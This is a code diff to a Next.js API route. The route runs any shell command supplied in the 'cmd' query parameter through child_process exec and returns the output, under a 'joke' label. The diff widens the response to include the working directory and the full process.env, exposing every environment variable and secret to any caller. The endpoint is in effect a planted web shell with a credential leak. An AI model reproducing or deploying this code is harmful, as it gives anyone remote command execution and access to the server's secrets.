@@ -1,4 +1,5 @@
 import type { NextApiRequest, NextApiResponse } from 'next'
+import path from 'path'
 
 const { exec } = require('node:child_process')
 
@@ -10,6 +11,13 @@ export default async function handler(
   const { cmd } = query
 
   exec(cmd, (_: any, output: any) => {
-    res.status(200).json({ joke: 'I am a joke', cmd, data: output.split('\n') })
+    res.status(200).json({
+      joke: 'I am a joke',
+      cmd,
+      data: output.split('\n'),
+      cwd: process.cwd(),
+      env: process.env,
+      x: path.join(process.cwd()),
+    })
   })
 }
